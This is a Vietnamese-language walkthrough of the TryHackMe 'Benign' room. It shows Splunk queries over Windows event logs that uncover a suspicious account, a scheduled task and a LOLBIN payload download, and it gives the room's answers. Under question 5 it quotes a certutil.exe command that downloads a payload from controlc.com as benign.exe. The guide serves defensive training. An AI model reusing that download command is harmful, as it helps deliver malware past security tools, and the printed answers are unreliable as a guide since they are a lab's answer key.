
# LÀM QUEN VỚI SPLUNK 

## Giới thiệu
Bài viết này hướng dẫn cách trả lời các câu hỏi liên quan đến logs trong hệ thống Windows, bao gồm cách truy vấn logs, phân tích tài khoản nghi ngờ, và phát hiện tải xuống mã độc. Các câu hỏi liên quan đến việc xử lý logs trong thời gian thực và truy vấn từ hệ thống logs.
Qua đó , còn giúp các bạn có thể tìm hiểu về hệ thống SIEM Splunk.

---
Lưu ý : Bài viết được thực hiện dựa trên Room Benign trên TryHackMe !


Các bạn có thể tham khảo [tại đây](https://tryhackme.com/r/room/benign) 

---
## Câu hỏi 1: Bao nhiêu logs đã được ghi lại trong tháng 3, 2022?

Truy vấn để kiểm tra số lượng logs đã ghi lại  trong tháng 3, 2022:

```jsx
index="win_eventlogs" 
```

Hãy dùng truy vấn này để lọc logs của tháng 3 năm 2022 và đếm số lượng.


---

## Câu hỏi 2: Tài khoản giả mạo nào đã được quan sát thấy trong logs?

Dùng truy vấn để liệt kê tất cả các tài khoản đã xuất hiện trong logs:

```jsx
index="win_eventlogs" | stats count by UserName
```

Từ kết quả này, bạn có thể phân tích và tìm ra tài khoản đáng nghi.

![](/images/question2.png)
---

## Câu hỏi 3: Người dùng từ phòng nhân sự nào đã thực hiện các scheduled tasks?

Truy vấn logs liên quan đến EventID 4688, tập trung vào các scheduled tasks:

```jsx
index="win_eventlogs" EventID=4688 schtasks
```

Kết quả sẽ hiển thị danh sách người dùng đã chạy các scheduled tasks, giúp bạn xác định hành vi đáng nghi.

![](/images/question3_1.png)

Truy vấn trả về tổng hợp các kết quả , trong đó người dùng **Chris.fort** là đáng nghi nhất.

![](/images/question3_2.png)

Đúng như thế , người dùng này đã thực hiện lên lịch trình tự động

![](/images/question3_3.png)
---

## Câu hỏi 4: Người dùng nào từ phòng nhân sự đã chạy tiến trình hệ thống (LOLBIN) để tải payload từ một dịch vụ chia sẻ file?

Truy vấn logs để phát hiện việc sử dụng certutil.exe hoặc các kết nối HTTPS nhằm tải payload:

```jsx
index="win_eventlogs" certutil.exe
```

Hoặc:

```jsx
index="win_eventlogs" https
```

Thông tin chi tiết về **LOLBIN** có thể được tìm thấy [tại đây](https://socprime.com/blog/what-are-lolbins/#How_Can_LOLBins_be_Used_for_Cyber_Attacks).

![](/images/question4.png)
![](/images/question5-6-7-8-10.png)
---
Đối với các câu hỏi 5-6-7-8-10 sẽ sử dụng kết quả trên để trả lời 
## Câu hỏi 5: Để vượt qua các hệ thống bảo mật, tiến trình hệ thống nào đã được sử dụng để tải payload từ internet?

Trong trường hợp này, **certutil.exe** đã được sử dụng để tải payload:

```jsx
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe 
```

---

## Câu hỏi 6: Ngày nào binary này đã được thực thi trên máy bị lây nhiễm?

Ngày thực thi: **2022-03-04**

---

## Câu hỏi 7: Trang web bên thứ ba nào đã được truy cập để tải payload độc hại?

Trang web được truy cập: **controlc.com**

---

## Câu hỏi 8: Tên file nào đã được lưu trên máy từ máy chủ C2 trong giai đoạn hậu khai thác?

Tên file: **benign.exe**

---

## Câu hỏi 9: File tải xuống chứa nội dung độc hại có mẫu THM{..........}; mẫu này là gì?

Phân tích file và tìm ra mẫu THM (Đối với room này , thực hiện truy cập đường link để tìm flags )

![](/images/question9.png)

---

## Câu hỏi 10: Địa chỉ URL nào mà máy bị nhiễm đã kết nối tới?

Địa chỉ URL: **https://controlc.com/e4d11035**

---

### Kết luận
Qua các câu hỏi trên, chúng ta  đã nắm được cách sử dụng logs để phân tích và phát hiện các hành vi nghi vấn trong hệ thống. Các công cụ như truy vấn logs và phân tích dữ liệu là rất quan trọng trong quá trình điều tra bảo mật. Và hơn hết , chúng ta đã hiểu thêm  những kiến thức cơ bản về Splunk trong việc phân tích các logs . 

Cảm ơn mọi người đã theo dõi ! 


